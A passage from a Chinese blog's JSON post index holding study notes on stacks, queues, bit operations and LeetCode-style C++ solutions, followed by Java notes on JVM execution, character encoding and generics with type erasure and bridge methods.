memset(dp,0,sizeof(dp)); for(int i=1;i&lt;=len1;i++) { for(int j=1;j&lt;=len2;j++) { if(text1[i-1]==text2[j-1]) { dp[i][j]=dp[i-1][j-1]+1; } else { dp[i][j]=max(dp[i][j-1],dp[i-1][j]); } } } return dp[len1][len2]; }}; 经典问题：","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://czqu.net/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}],"author":"陈子琦"},{"title":"算法与数据结构学习笔记：栈和队列","slug":"release/2020-8-6-stack-and-queue","date":"2020-09-11T03:00:00.000Z","updated":"2020-09-11T03:00:00.000Z","comments":true,"path":"posts/51468/","permalink":"https://czqu.net/posts/51468/","excerpt":"","text":"简介栈的特点是后入先出，根据这个特点可以临时保存一些数据，之后用到依次再弹出来，常用于 DFS 深度搜索 队列一般常用于 BFS 广度搜索，类似一层一层的搜索 栈155. 最小栈 设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。 push(x) —— 将元素 x 推入栈中。pop() —— 删除栈顶的元素。top() —— 获取栈顶元素。getMin() —— 检索栈中的最小元素。 辅助栈12345678910111213141516171819202122232425262728293031323334353637383940class MinStack {public: /** initialize your data structure here. */ stack&lt;int&gt; minStack; stack&lt;int&gt; dataStack; MinStack() { minStack.push(INT_MAX); } void push(int x) { dataStack.push(x); minStack.push(min(minStack.top(),x)); } void pop() { minStack.pop(); dataStack.pop(); } int top() { return dataStack.top(); } int getMin() { return minStack.top(); }};/** * Your MinStack object will be instantiated and called as such: * MinStack* obj = new MinStack(); * obj-&gt;push(x); * obj-&gt;pop(); * int param_3 = obj-&gt;top(); * int param_4 = obj-&gt;getMin(); */ 150. 逆波兰表达式求值 根据 逆波兰表示法，求表达式的值。 有效的运算符包括 +, -, *, / 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。 思路：通过栈保存原来的元素，遇到表达式弹出运算，再推入结果，重复这个过程 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution {public: int evalRPN(vector&lt;string&gt;&amp; tokens) { if(tokens.empty()) return 0; stack&lt;int&gt; st; for(int i=0;i&lt;tokens.size();i++) { if(tokens[i]==\"+\"||tokens[i]==\"-\"||tokens[i]==\"*\"||tokens[i]==\"/\") { if(st.size()&lt;2) return -1; auto b=st.top(); st.pop(); auto a=st.top(); st.pop(); int res; switch(tokens[i][0]) { case '+': res=a+b; break; case '-': res=a-b; break; case '*': res=a*b; break; case '/': res=a/b; break; } st.push(res); } else { st.push(atoi(tokens[i].c_str())); } } return st.top(); }}; 394. 字符串解码 给定一个经过编码的字符串，返回它解码后的字符串。 编码规则为: k[encoded_string]，表示其中方括号内部的 encoded_string 正好重复 k 次。注意 k 保证为正整数。 你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。 此外，你可以认为原始数据不包含数字，所有的数字只表示重复的次数 k ，例如不会出现像 3a 或 2[4] 的输入。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution {public: string decodeString(string s) { stack&lt;int&gt; nums; stack&lt;string&gt; strs; string res=\"\"; int num=0; for(int i=0;i&lt;s.size();i++) { char ch=s[i]; if(ch&gt;='0'&amp;&amp;ch&lt;='9') { //多位数情况处理 num=num*10+ch-'0'; }else if((ch &gt;= 'a' &amp;&amp; ch &lt;= 'z') ||(ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z')) { res+=ch; } else if(ch=='[') { nums.push(num); num=0; strs.push(res); res=\"\"; } else { int j=nums.top(); nums.pop(); while(j--) { strs.top()+=res; } res=strs.top(); //之后若还是字母，就会直接加到res之后，因为它们是同一级的运算 //若是左括号，res会被压入strs栈，作为上一层的运算 strs.pop(); } } return res; }}; 94. 二叉树的中序遍历123456789101112131415161718192021222324252627282930313233343536/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;int&gt; inorderTraversal(TreeNode* root) { vector&lt;int&gt;ans; if(root==NULL) return ans; stack&lt;TreeNode*&gt; st; auto cur=root; while(cur!=NULL||!st.empty()) { while(cur!=NULL) { st.push(cur); cur=cur-&gt;left; } cur=st.top(); st.pop(); ans.push_back(cur-&gt;val); cur=cur-&gt;right; } return ans; }}; 133. 克隆图 给你无向 连通 图中一个节点的引用，请你返回该图的 深拷贝（克隆）。 图中的每个节点都包含它的值 val（int） 和其邻居的列表（list[Node]）。 1234class Node { public int val; public List&lt;Node&gt; neighbors;} 123456789101112131415161718192021222324252627282930313233343536373839404142/*// Definition for a Node.class Node {public: int val; vector&lt;Node*&gt; neighbors; Node() { val = 0; neighbors = vector&lt;Node*&gt;(); } Node(int _val) { val = _val; neighbors = vector&lt;Node*&gt;(); } Node(int _val, vector&lt;Node*&gt; _neighbors) { val = _val; neighbors = _neighbors; }};*/class Solution {public: unordered_map&lt;Node*,Node*&gt; mp; Node* cloneGraph(Node* node) { if(node==NULL) return node; if(mp.count(node)) return mp[node]; const auto newnode=new Node(node-&gt;val); mp[node]=newnode; for(auto n:node-&gt;neighbors) { mp[node]-&gt;neighbors.push_back(cloneGraph(n)); } return mp[node]; }}; 200. 岛屿数量 给你一个由 ‘1’（陆地）和 ‘0’（水）组成的的二维网格，请你计算网格中岛屿的数量。 岛屿总是被水包围，并且每座岛屿只能由水平方向或竖直方向上相邻的陆地连接形成。 此外，你可以假设该网格的四条边均被水包围。 123456789101112131415161718192021222324252627class Solution {public: int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) { int count = 0; for(int i = 0; i &lt; grid.size(); i++){ for(int j = 0; j &lt; grid[0].size(); j++){ if(grid[i][j] == '1'){ dfs(grid, i, j); count++; } } } return count; } void dfs(vector&lt;vector&lt;char&gt;&gt;&amp; grid, int i, int j){ if(i &lt; 0 || i &gt;= grid.size() || j &lt; 0 || j &gt;= grid[0].size() || grid[i][j] != '1'){ return; } grid[i][j] = '2'; dfs(grid, i + 1, j); dfs(grid, i - 1, j); dfs(grid, i, j + 1); dfs(grid, i, j - 1); }}; 84. 柱状图中最大的矩形队列232. 用栈实现队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566class MyQueue {public: stack&lt;int&gt; s1,s2; int front; /** Initialize your data structure here. */ MyQueue() { } /** Push element x to the back of queue. */ void push(int x) { if(s1.empty()) front=x; s1.push(x); } /** Removes the element from in front of queue and returns that element. */ int pop() { if(s2.empty()) { while(!s1.empty()) { s2.push(s1.top()); s1.pop(); } } int ret =s2.top(); s2.pop(); return ret; } /** Get the front element. */ int peek() { if(!s2.empty()) { return s2.top(); } return front; } /** Returns whether the queue is empty. */ bool empty() { if(s1.empty()&amp;&amp;s2.empty()) { return true; } else { return false; } }};/** * Your MyQueue object will be instantiated and called as such: * MyQueue* obj = new MyQueue(); * obj-&gt;push(x); * int param_2 = obj-&gt;pop(); * int param_3 = obj-&gt;peek(); * bool param_4 = obj-&gt;empty(); */ 102. 二叉树的层序遍历 给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。 12345678910111213141516171819202122232425262728293031323334353637/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) { vector&lt;vector&lt;int&gt;&gt; res; if(root==NULL) return res; queue&lt;TreeNode *&gt; q; q.push(root); while(!q.empty()) { int currentLevelSize=q.size(); vector&lt;int&gt; level; for(int i=0;i&lt;currentLevelSize;i++) { auto cur=q.front(); level.push_back(cur-&gt;val); q.pop(); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); } res.push_back(level); } return res; }}; 542. 01 矩阵","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"栈","slug":"栈","permalink":"https://czqu.net/tags/%E6%A0%88/"},{"name":"队列","slug":"队列","permalink":"https://czqu.net/tags/%E9%98%9F%E5%88%97/"}],"author":"陈子琦"},{"title":"算法与数据结构学习笔记：二进制","slug":"release/2020-8-7-binary_op","date":"2020-09-07T04:55:01.000Z","updated":"2020-09-07T04:55:01.000Z","comments":true,"path":"posts/48007/","permalink":"https://czqu.net/posts/48007/","excerpt":"","text":"常见二进制操作C++位运算符下表显示了 C++ 支持的位运算符。 假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示： A = 0011 1100 B = 0000 1101 则： 运算符 描述 实例 &amp; 如果同时存在于两个操作数中，二进制 AND 运算符复制一位到结果中。 (A &amp; B) 将得到 12，即为 0000 1100 | 如果存在于任一操作数中，二进制 OR 运算符复制一位到结果中。 (A | B) 将得到 61，即为 0011 1101 ^ 如果存在于其中一个操作数中但不同时存在于两个操作数中，二进制异或运算符复制一位到结果中。 (A ^ B) 将得到 49，即为 0011 0001 ~ 二进制补码运算符是一元运算符，具有”翻转”位效果，即0变成1，1变成0。 (~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。 &lt;&lt; 二进制左移运算符。左操作数的值向左移动右操作数指定的位数。 A &lt;&lt; 2 将得到 240，即为 1111 0000 &gt;&gt; 二进制右移运算符。左操作数的值向右移动右操作数指定的位数。 A &gt;&gt; 2 将得到 15，即为 0000 1111 基本操作a=0^a=a^0 0=a^a 由上面两个推导出：a=a^b^b 交换两个数a=a^b b=a^b a=a^b 移除最后一个 1a=n&amp;(n-1) 获取最后一个 1diff=(n&amp;(n-1))^n 常见题目136. 只出现一次的数字 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 示例 1: 输入: [2,2,1]输出: 1示例 2: 输入: [4,1,2,1,2]输出: 4 123456789101112class Solution {public: int singleNumber(vector&lt;int&gt;&amp; nums) { int ret=0; for(auto num:nums) { ret^=num; } return ret; }}; 137. 只出现一次的数字 II 给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。 说明： 你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？ 示例 1: 12输入: [2,2,3,2]输出: 3 示例 2: 12输入: [0,1,0,1,0,1,99]输出: 99 遍历统计如果所有数字都出现了 3 次，那么每一列的 1 的个数就一定是 3 的倍数。之所以有的列不是 3 的倍数，就是因为只出现了 1 次的数贡献出了 1。所以所有不是 3 的倍数的列写 1，其他列写 0 ，就找到了这个出现 1 次的数。 假如例子是 1 2 6 1 1 2 2 3 3 3, 3 个 1, 3 个 2, 3 个 3,1 个 61 0 0 12 0 1 06 1 1 01 0 0 11 0 0 12 0 1 02 0 1 03 0 1 13 0 1 13 0 1 1看最右边的一列 1001100111 有 6 个 1再往前看一列 0110011111 有 7 个 1再往前看一列 0010000 有 1 个 1我们只需要把是 3 的倍数的对应列写 0，不是 3 的倍数的对应列写 1也就是 1 1 0,也就是 6。 12345678910111213141516171819class Solution {public: int singleNumber(vector&lt;int&gt;&amp; nums) { int ret=0; for(int i=0;i&lt;32;i++) { int sum=0; for(int j=0;j&lt;nums.size();j++) { sum+=(nums[j]&gt;&gt;i)&amp;1; } ret^=(sum%3)&lt;&lt;i; } return ret; }}; 有限状态自动机","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"二进制","slug":"二进制","permalink":"https://czqu.net/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}],"author":"陈子琦"},{"title":"Java学习笔记-基础篇","slug":"release/2020-8-6-java-note-basic","date":"2020-08-06T08:13:10.000Z","updated":"2020-08-06T08:13:10.000Z","comments":true,"path":"posts/53914/","permalink":"https://czqu.net/posts/53914/","excerpt":"","text":"Java程序怎么样运行的Java 程序从源代码到运行一般有下面 3 步：我们需要格外注意的是 .class-&gt;机器码 这一步。在这一步 JVM 类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的(也就是所谓的热点代码)，所以后面引进了 JIT 编译器，而 JIT 属于运行时编译。当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。而我们知道，机器码的运行效率肯定是高于 Java 解释器的。这也解释了我们为什么经常会说 Java 是编译与解释共存的语言。 HotSpot 采用了惰性评估(Lazy Evaluation)的做法，根据二八定律，消耗大部分系统资源的只有那一小部分的代码（热点代码），而这也就是 JIT 所需要编译的部分。JVM 会根据代码每次被执行的情况收集信息并相应地做出一些优化，因此执行的次数越多，它的速度就越快。JDK 9 引入了一种新的编译模式 AOT(Ahead of Time Compilation)，它是直接将字节码编译成机器码，这样就避免了 JIT 预热等各方面的开销。JDK 支持分层编译和 AOT 协作使用。但是 ，AOT 编译器的编译质量是肯定比不上 JIT 编译器的。 总结： Java 虚拟机（JVM）是运行 Java 字节码的虚拟机。JVM 有针对不同系统的特定实现（Windows，Linux，macOS），目的是使用相同的字节码，它们都会给出相同的结果。字节码和不同系统的 JVM 实现是 Java 语言“一次编译，随处可以运行”的关键所在。 为什么说 Java 语言“编译与解释并存”？高级编程语言按照程序的执行方式分为编译型和解释型两种。简单来说，编译型语言是指编译器针对特定的操作系统将源代码一次性翻译成可被该平台执行的机器码；解释型语言是指解释器对源程序逐行解释成特定平台的机器码并立即执行。比如，你想阅读一本英文名著，你可以找一个英文翻译人员帮助你阅读， 有两种选择方式，你可以先等翻译人员将全本的英文名著（也就是源码）都翻译成汉语，再去阅读，也可以让翻译人员翻译一段，你在旁边阅读一段，慢慢把书读完。 Java 语言既具有编译型语言的特征，也具有解释型语言的特征，因为 Java 程序要经过先编译，后解释两个步骤，由 Java 编写的程序需要先经过编译步骤，生成字节码（*.class 文件），这种字节码必须由 Java 解释器来解释执行。因此，我们可以认为 Java 语言编译与解释并存 java与C语言在字符串结束符上的区别在C语言中字符串或字符数组最后都会有一个额外的字符‘\\0’来表示结束，而在java语言中没有结束符这一概念。参考：https://blog.csdn.net/sszgg2006/article/details/49148189 java中无需结束符的原因Java里面一切都是对象，是对象的话，字符串肯定就有长度，即然有长度，编译器就可以确定要输出的字符个数，当然也就没有必要去浪费那1字节的空间用以标明字符串的结束了。比如，数组对象里有一个属性length,就是数组的长度，String类里面有方法length()可以确定字符串的长度，因此对于输出函数来说，有直接的大小可以判断字符串的边界，编译器就没必要再去浪费一个空间标识字符串的结束。 java字符串末尾空字符的处理 java和c通信的时候，由于c中的char中有结束符的，所以当java收到C发来的字符串时，后面往往会有若干空字符，如果不做处理的话，java会对其一并输出，为了将空字符处理掉不输出，可以采用如下两种方法： 方法一: 调用java字符串的trim()方法，该方法会将字符串前后的空字符读去掉。 方法二：自己实现去掉尾部空字符的方法 字符型常量和字符串常量的区别?形式上: 字符常量是单引号引起的一个字符; 字符串常量是双引号引起的若干个字符含义上: 字符常量相当于一个整型值( ASCII 值),可以参加表达式运算; 字符串常量代表一个地址值(该字符串在内存中存放位置)占内存大小 字符常量只占 2 个字节; 字符串常量占若干个字节 (注意： char 在 Java 中占两个字节) java 编程思想第四版：2.2.2 节JVM内部使用的是UTF-16编码。不管代码文件中char使用的是什么编码，都将被JVM转化为UTF-16而且只用两个字节，也就是说Java中的char占用两个字节，只能表示Unicode中第一层（BMP）中的字符，对于其他字符会报错：Invalid Character Constant, 而String中是可以的。如果一个抽象的字符在 UTF-16 编码下占 4 字节，显然它是不能放到 char 中的。换言之， char 中只能放 UTF-16 编码下只占 2 字节的那些字符。 String.getBytes()是一个用于将String的内码转换为指定的外码的方法。无参数版使用平台的默认编码作为外码，有参数版使用参数指定的编码作为外码；将String的内容用外码编码好，结果放在一个新byte[]返回。getBytes 实际是做编码转换，你应该显式传入一个参数来指定编码，否则它会使用缺省编码来转换。 “字”在 GBK 编码下占 2 字节，在 UTF-16 编码下也占 2 字节，在 UTF-8 编码下占 3 字节，在 UTF-32 编码下占 4 字 “ new String(“字”).getBytes().length 返回的是3 ”，这说明缺省编码是 UTF-8. 如果你显式地传入一个参数，比如这样“ new String(“字”).getBytes(“GBK”).length ”，那么返回就是 2. 你可以在启动 JVM 时设置一个缺省编码， 假设你的类叫 Main，那么在命令行中用 java 执行这个类时可以通过 file.encoding 参数设置一个缺省编码。 比如这样：java -Dfile.encoding=GBK Main 这时，你再执行不带参数的 getBytes() 方法时，new String(“字”).getBytes().length 返回的就是 2 了，因为现在缺省编码变成 GBK 了。 当然，如果这时你显式地指定编码，new String(“字”).getBytes(“UTF-8”).length 返回的则依旧是 3. 否则，会使用所在操作系统环境下的缺省编码。 通常，Windows 系统下是 GBK，Linux 和 Mac 是 UTF-8. 但有一点要注意，在 Windows 下使用 IDE 来运行时，比如 Eclipse，如果你的工程的缺省编码是 UTF-8，在 IDE 中运行你的程序时，会加上上述的 -Dfile.encoding=UTF-8 参数，这时，即便你在 Windows 下，缺省编码也是 UTF-8，而不是 GBK。 总结:char在Java占两字节,大于两字节的不能存.在String里,每个字符大小不同。 Java中有哪些常见的关键字？ Java泛型，以及类型擦除，常用的通配符Java 泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。 Java泛型类型擦除以及类型擦除带来的问题 https://www.cnblogs.com/wuqinglong/p/9456193.html大家都知道，Java的泛型是伪泛型，这是因为Java在编译期间，所有的泛型信息都会被擦掉，正确理解泛型概念的首要前提是理解类型擦除。Java的泛型基本上都是在编译器这个层次上实现的，在生成的字节码中是不包含泛型中的类型信息的，使用泛型的时候加上类型参数，在编译器编译的时候会去掉，这个过程成为类型擦除。 原始类型 就是擦除去了泛型信息，最后在字节码中的类型变量的真正类型，无论何时定义一个泛型，相应的原始类型都会被自动提供，类型变量擦除，并使用其限定类型（无限定的变量用Object）替换。 如在代码中定义List和List等类型，在编译后都会变成List，JVM看到的只是List，而由泛型附加的类型信息对JVM是看不到的。Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法在运行时刻出现的类型转换异常的情况，类型擦除也是Java的泛型与C++模板机制实现方式之间的重要区别。 在程序中定义了一个ArrayList泛型类型实例化为Integer对象，如果直接调用add()方法，那么只能存储整数数据，不过当我们利用反射调用add()方法的时候，却可以存储字符串，这说明了Integer泛型实例在编译之后被擦除掉了，只保留了原始类型。 在调用泛型方法时，可以指定泛型，也可以不指定泛型。 在不指定泛型的情况下，泛型变量的类型为该方法中的几种类型的同一父类的最小级，直到Object 在指定泛型的情况下，该方法的几种类型必须是该泛型的实例的类型或者其子类 12345678910111213141516171819public class Test { public static void main(String[] args) { /**不指定泛型的时候*/ int i = Test.add(1, 2); //这两个参数都是Integer，所以T为Integer类型 Number f = Test.add(1, 1.2); //这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Number Object o = Test.add(1, \"asd\"); //这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Object /**指定泛型的时候*/ int a = Test.&lt;Integer&gt;add(1, 2); //指定了Integer，所以只能为Integer类型或者其子类 int b = Test.&lt;Integer&gt;add(1, 2.2); //编译错误，指定了Integer，不能为Float Number c = Test.&lt;Number&gt;add(1, 2.2); //指定为Number，所以可以为Integer和Float } //这是一个简单的泛型方法 public static &lt;T&gt; T add(T x,T y){ return y; } } 其实在泛型类中，不指定泛型的时候，也差不多，只不过这个时候的泛型为Object，就比如ArrayList中，如果不指定泛型，那么这个ArrayList可以存储任意的对象。 123456public static void main(String[] args) { ArrayList list = new ArrayList(); list.add(1); list.add(\"121\"); list.add(new Date()); } 类型擦除引起的问题及解决方法3-1.先检查，再编译以及编译的对象和引用传递问题Q: 既然说类型变量会在编译的时候擦除掉，那为什么我们往 ArrayList 创建的对象中添加整数会报错呢？不是说泛型变量String会在编译的时候变为Object类型吗？为什么不能存别的类型呢？既然类型擦除了，如何保证我们只能使用泛型变量限定的类型呢？ A: Java编译器是通过先检查代码中泛型的类型，然后在进行类型擦除，再进行编译。 那么，这个类型检查是针对谁的呢？我们先看看参数化类型和原始类型的兼容。 以 ArrayList举例子，以前的写法: 1ArrayList list = new ArrayList(); 现在的写法: 1ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); 如果是与以前的代码兼容，各种引用传值之间，必然会出现如下的情况： 12ArrayList&lt;String&gt; list1 = new ArrayList(); //第一种 情况ArrayList list2 = new ArrayList&lt;String&gt;(); //第二种 情况 这样是没有错误的，不过会有个编译时警告。 不过在第一种情况，可以实现与完全使用泛型参数一样的效果，第二种则没有效果。 因为类型检查就是编译时完成的，new ArrayList()只是在内存中开辟了一个存储空间，可以存储任何类型对象，而真正设计类型检查的是它的引用，因为我们是使用它引用list1来调用它的方法，比如说调用add方法，所以list1引用能完成泛型类型的检查。而引用list2没有使用泛型，所以不行。 举例子： 123456789101112131415161718192021public class Test { public static void main(String[] args) { ArrayList&lt;String&gt; list1 = new ArrayList(); list1.add(\"1\"); //编译通过 list1.add(1); //编译错误 String str1 = list1.get(0); //返回类型就是String ArrayList list2 = new ArrayList&lt;String&gt;(); list2.add(\"1\"); //编译通过 list2.add(1); //编译通过 Object object = list2.get(0); //返回类型就是Object new ArrayList&lt;String&gt;().add(\"11\"); //编译通过 new ArrayList&lt;String&gt;().add(22); //编译错误 String str2 = new ArrayList&lt;String&gt;().get(0); //返回类型就是String } } 通过上面的例子，我们可以明白，类型检查就是针对引用的，谁是一个引用，用这个引用调用泛型方法，就会对这个引用调用的方法进行类型检测，而无关它真正引用的对象。 泛型中参数话类型为什么不考虑继承关系？ 在Java中，像下面形式的引用传递是不允许的: 12345678ArrayList&lt;String&gt; list1 = new ArrayList&lt;Object&gt;(); //编译错误 ArrayList&lt;Object&gt; list2 = new ArrayList&lt;String&gt;(); //编译错误我们先看第一种情况，将第一种情况拓展成下面的形式：ArrayList&lt;Object&gt; list1 = new ArrayList&lt;Object&gt;(); list1.add(new Object()); list1.add(new Object()); ArrayList&lt;String&gt; list2 = list1; //编译错误 实际上，在第4行代码的时候，就会有编译错误。那么，我们先假设它编译没错。那么当我们使用list2引用用get()方法取值的时候，返回的都是String类型的对象（上面提到了，类型检测是根据引用来决定的），可是它里面实际上已经被我们存放了Object类型的对象，这样就会有ClassCastException了。所以为了避免这种极易出现的错误，Java不允许进行这样的引用传递。（这也是泛型出现的原因，就是为了解决类型转换的问题，我们不能违背它的初衷）。 再看第二种情况，将第二种情况拓展成下面的形式： 12345ArrayList&lt;String&gt; list1 = new ArrayList&lt;String&gt;(); list1.add(new String()); list1.add(new String());ArrayList&lt;Object&gt; list2 = list1; //编译错误 没错，这样的情况比第一种情况好的多，最起码，在我们用list2取值的时候不会出现ClassCastException，因为是从String转换为Object。可是，这样做有什么意义呢，泛型出现的原因，就是为了解决类型转换的问题。我们使用了泛型，到头来，还是要自己强转，违背了泛型设计的初衷。所以java不允许这么干。再说，你如果又用list2往里面add()新的对象，那么到时候取得时候，我怎么知道我取出来的到底是String类型的，还是Object类型的呢？ 所以，要格外注意，泛型中的引用传递的问题。 3-2.自动类型转换因为类型擦除的问题，所以所有的泛型类型变量最后都会被替换为原始类型。 既然都被替换为原始类型，那么为什么我们在获取的时候，不需要进行强制类型转换呢？ 看下ArrayList.get()方法： 1234567public E get(int index) { RangeCheck(index); return (E) elementData[index]; } 可以看到，在return之前，会根据泛型变量进行强转。假设泛型类型变量为Date，虽然泛型信息会被擦除掉，但是会将(E) elementData[index]，编译为(Date)elementData[index]。所以我们不用自己进行强转。当存取一个泛型域时也会自动插入强制类型转换。假设Pair类的value域是public的，那么表达式： 1Date date = pair.value; 也会自动地在结果字节码中插入强制类型转换。 3-3.类型擦除与多态的冲突和解决方法现在有这样一个泛型类： 123456789101112class Pair&lt;T&gt; { private T value; public T getValue() { return value; } public void setValue(T value) { this.value = value; } } 然后我们想要一个子类继承它。 123456789101112class DateInter extends Pair&lt;Date&gt; { @Override public void setValue(Date value) { super.setValue(value); } @Override public Date getValue() { return super.getValue(); } } 在这个子类中，我们设定父类的泛型类型为Pair，在子类中，我们覆盖了父类的两个方法，我们的原意是这样的：将父类的泛型类型限定为Date，那么父类里面的两个方法的参数都为Date类型。 1234567public Date getValue() { return value; } public void setValue(Date value) { this.value = value; } 所以，我们在子类中重写这两个方法一点问题也没有，实际上，从他们的@Override标签中也可以看到，一点问题也没有，实际上是这样的吗？ 分析：实际上，类型擦除后，父类的的泛型类型全部变为了原始类型Object，所以父类编译之后会变成下面的样子： 1234567891011class Pair { private Object value; public Object getValue() { return value; } public void setValue(Object value) { this.value = value; } } 再看子类的两个重写的方法的类型： 12345678@Override public void setValue(Date value) { super.setValue(value); } @Override public Date getValue() { return super.getValue(); } 先来分析setValue方法，父类的类型是Object，而子类的类型是Date，参数类型不一样，这如果是在普通的继承关系中，根本就不会是重写，而是重载。 我们在一个main方法测试一下： 12345public static void main(String[] args) throws ClassNotFoundException { DateInter dateInter = new DateInter(); dateInter.setValue(new Date()); dateInter.setValue(new Object()); //编译错误 } 如果是重载，那么子类中两个setValue方法，一个是参数Object类型，一个是Date类型，可是我们发现，根本就没有这样的一个子类继承自父类的Object类型参数的方法。所以说，确实是重写了，而不是重载了。 为什么会这样呢？ 原因是这样的，我们传入父类的泛型类型是Date，Pair，我们的本意是将泛型类变为如下： 123456789class Pair { private Date value; public Date getValue() { return value; } public void setValue(Date value) { this.value = value; } } 然后再子类中重写参数类型为Date的那两个方法，实现继承中的多态。 可是由于种种原因，虚拟机并不能将泛型类型变为Date，只能将类型擦除掉，变为原始类型Object。这样，我们的本意是进行重写，实现多态。可是类型擦除后，只能变为了重载。这样，类型擦除就和多态有了冲突。JVM知道你的本意吗？知道！！！可是它能直接实现吗，不能！！！如果真的不能的话，那我们怎么去重写我们想要的Date类型参数的方法啊。 于是JVM采用了一个特殊的方法，来完成这项功能，那就是桥方法。 首先，我们用javap -c className的方式反编译下DateInter子类的字节码，结果如下： 1234567891011121314151617181920212223242526272829303132333435class com.tao.test.DateInter extends com.tao.test.Pair&lt;java.util.Date&gt; { com.tao.test.DateInter(); Code: 0: aload_0 1: invokespecial #8 // Method com/tao/test/Pair.\"&lt;init&gt;\":()V 4: return public void setValue(java.util.Date); //我们重写的setValue方法 Code: 0: aload_0 1: aload_1 2: invokespecial #16 // Method com/tao/test/Pair.setValue:(Ljava/lang/Object;)V 5: return public java.util.Date getValue(); //我们重写的getValue方法 Code: 0: aload_0 1: invokespecial #23 // Method com/tao/test/Pair.getValue:()Ljava/lang/Object; 4: checkcast #26 // class java/util/Date 7: areturn public java.lang.Object getValue(); //编译时由编译器生成的巧方法 Code: 0: aload_0 1: invokevirtual #28 // Method getValue:()Ljava/util/Date 去调用我们重写的getValue方法; 4: areturn public void setValue(java.lang.Object); //编译时由编译器生成的巧方法 Code: 0: aload_0 1: aload_1 2: checkcast #26 // class java/util/Date 5: invokevirtual #30 // Method setValue:(Ljava/util/Date; 去调用我们重写的setValue方法)V 8: return } 从编译的结果来看，我们本意重写setValue和getValue方法的子类，竟然有4个方法，其实不用惊奇，最后的两个方法，就是编译器自己生成的桥方法。可以看到桥方法的参数类型都是Object，也就是说，子类中真正覆盖父类两个方法的就是这两个我们看不到的桥方法。而打在我们自己定义的setvalue和getValue方法上面的@Oveerride只不过是假象。而桥方法的内部实现，就只是去调用我们自己重写的那两个方法。 所以，虚拟机巧妙的使用了桥方法，来解决了类型擦除和多态的冲突。 不过，要提到一点，这里面的setValue和getValue这两个桥方法的意义又有不同。 setValue方法是为了解决类型擦除与多态之间的冲突。 而getValue却有普遍的意义，怎么说呢，如果这是一个普通的继承关系： 那么父类的setValue方法如下： 123public ObjectgetValue() { return super.getValue(); } 而子类重写的方法是： 123public Date getValue() { return super.getValue(); } 其实这在普通的类继承中也是普遍存在的重写，这就是协变。https://extremegtr.github.io/2016/07/11/Covariance-And-Contravariance-In-Java/ 协变 / 共变（covariance）指的是子类型关系在类型变换的作用下保持原样。不可变（invariance） 表示子类型关系在类型变换的作用下，既没有协变的效果，也没有逆变的效果。逆变 / 反变（contravariance）指的是子类型关系在类型变换的作用下发生逆转。双变（bivariance）表示子类型关系在类型变换的作用下同时拥有协变与逆变2种效果。Java支持协变数组，你可能会问Java支持逆变数组吗？答案是：Java不支持逆变数组。https://codingnote.com/2020/03/08/java-covariant-contravariant-invariant/https://extremegtr.github.io/2016/05/30/JavaSE-study-advanced-generics/#u901A_u914D_u7B26_uFF08Wildcard_uFF09Java下限通配符实现逆变由于Java泛型的不可变性，generateIntegers() 生成的List不能放到输入参数output指定的List中。那么有没有办法把 List 